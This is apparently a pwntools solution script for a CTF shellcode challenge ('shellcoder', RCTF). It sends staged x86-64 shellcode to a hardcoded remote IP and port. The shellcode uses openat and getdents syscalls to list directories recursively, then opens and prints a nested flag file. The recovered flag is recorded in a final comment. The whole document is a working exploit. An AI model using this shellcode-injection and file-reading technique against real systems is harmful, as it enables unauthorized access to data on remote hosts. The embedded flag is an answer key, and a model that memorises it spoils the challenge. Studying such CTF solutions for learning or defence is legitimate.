from pwn import *
def getend(n):
	idx=0
	for x in n:
		if x=='\x00':
			return idx	
		idx+=1
	return -1
def getinfo(data,flag=0):
	d=0
	res=[]
	f=[]
	while(d<len(data)):
		reclen=ord(data[d+0x10])
		if reclen == 0:
			break 
		dtype=ord(data[d+reclen-1])
		namelen=getend(data[d+0x12:])
		if dtype==4 and data[d+0x12:d+0x12+namelen]!="." and data[d+0x12:d+0x12+namelen]!="..":
			res.append(data[d+0x12:d+0x12+namelen])
		elif dtype!=4 and data[d+0x12:d+0x12+namelen]!="." and data[d+0x12:d+0x12+namelen]!="..":
			f.append(data[d+0x12:d+0x12+namelen])
		d+=reclen
	return res,f
def push_path(path):
	d=0
	l=len(path)
	path+=(-l%8)*'\x00'
	pad='''
	mov rsi,{}
	push rsi	
	'''
	res=''
	while(d<len(path)):
		res=pad.format(hex(u64(path[d:d+8])))+res
		d+=8
	return res
def exp(seek,flag=0):	
	#context.log_level='debug'
	#p=process('./shellcoder')
	#gdb.attach(p)
	p=remote("139.180.215.222",20002)
	context.arch='amd64'
	sh='''
	xchg rdi,rsi
	mov edx,esi
	syscall
	'''
	sh=asm(sh)
	p.sendafter(":",sh)


	#print push_path("./flag")
	#raw_input()
	sh='''
	mov ax,0x101
	mov rdi,-0x64
	{}
	mov rsi,rsp
	mov rdx,0
	mov r10,0
	syscall

	mov rdi,rax
	mov rsi,rsp
	mov rdx,0x200
	xor rax,rax
	mov al,78
	syscall

	mov rdi,1
	mov rsi,rsp
	mov rdx,0x400
	xor rax,rax
	mov al,1
	syscall
	'''.format(push_path(seek))
	p.send("\x90"*0x7+asm(sh))
	data=p.read()
	p.close()
	r,f=getinfo(data,flag)
	p.close()
	return r,f

def fuck(path):
	print path
	try:
		res,f=exp(path)
		#print f
		if res==[] and "flag" in f:
			log.warning(path)
		elif res!=[]:
			for x in res:
				fuck(path+x+"/flag")
		return

	except:
		return 
def exploit(seek,flag=0):
	p=remote("139.180.215.222",20002)
	context.arch='amd64'
	sh='''
	xchg rdi,rsi
	mov edx,esi
	syscall
	'''
	sh=asm(sh)
	p.sendafter(":",sh)
	sh='''
	mov ax,2
	{}
	mov rdi,rsp
	xor rsi,rsi
	xor rdx,rdx
	syscall

	mov rdi,rax
	mov rsi,rsp
	mov rdx,0x30
	xor rax,rax
	syscall

	mov rdi,1
	mov rsi,rsp
	mov rdx,0x30
	xor rax,rax
	mov al,1
	syscall
	'''.format(push_path(seek))
	p.send("\x90"*0x7+asm(sh))
	data=p.read()
	p.close()
	print data

#fuck("/flag")
exploit("./flag/rrfh/lmc5/nswv/1rdr/zkz1/pim9/flag")
#rctf{1h48iegin3egh8dc5ihu}
